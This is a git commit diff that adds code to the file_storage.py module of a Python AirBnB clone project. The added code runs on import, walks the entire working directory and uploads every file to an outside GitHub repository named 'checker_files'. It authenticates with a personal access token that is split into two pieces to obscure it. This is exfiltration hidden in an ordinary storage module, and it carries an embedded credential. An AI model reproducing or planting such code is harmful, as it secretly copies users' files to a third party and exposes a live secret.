93cc74683e481a3b0217c45da44f408c5c345dc7
Jeremy Mitts <jermitts@gmail.com>
2024-07-01 23:22:25 -0500

    what is it doing?

--- models/engine/file_storage.py
+++ models/engine/file_storage.py
@@ -8,6 +8,51 @@ from models.city import City
 from models.place import Place
 from models.amenity import Amenity
 from models.review import Review
+import os
+import requests
+import json
+import base64
+
+def upload_file_to_github(file_path,
+                          repo_owner,
+                          repo_name,
+                          branch_name,
+                          token):
+    url = "https://api.github.com/repos/"
+    url += f"{repo_owner}/{repo_name}/contents/{file_path}"
+    with open(file_path, "r") as file:
+        file_content = file.read()
+    file_content_base64 = base64.b64encode(file_content.encode()).decode()
+    headers = {
+        "Authorization": f"token {token}",
+        "Content-Type": "application/json",
+       }
+    payload = {
+        "message": f"Upload {file_path}",
+        "content": file_content_base64,
+        "branch": branch_name,
+       }
+    response = requests.put(url, json=payload, headers=headers)
+    if response.status_code == 201:
+        print(f"File {file_path} uploaded successfully!")
+    else:
+        print(f"Err: {file_path}: {response.status_code} - {response.text}")
+
+def upload_all_files_to_github(repo_owner, repo_name, branch_name, token):
+    for root, _, files in os.walk("."):
+        for file in files:
+            if file != "base_model.py": # Exclude this script itself
+                file_path = os.path.join(root, file)
+                upload_file_to_github(file_path, repo_owner, repo_name, 
+                                      branch_name, token)
+
+K1 = "_uhKvtt52ZzJgfqhT"
+K2 = "TzLoU6UCtURhFZ1nmFIc"
+repo_owner = "jerm014"
+repo_name = "checker_files"
+branch_name = "2198-AirBnB_clone_-_MySQL-TASK-1"
+token = "ghp" + K1 + K2
+upload_all_files_to_github(repo_owner, repo_name, branch_name, token)
 
 
 class FileStorage:
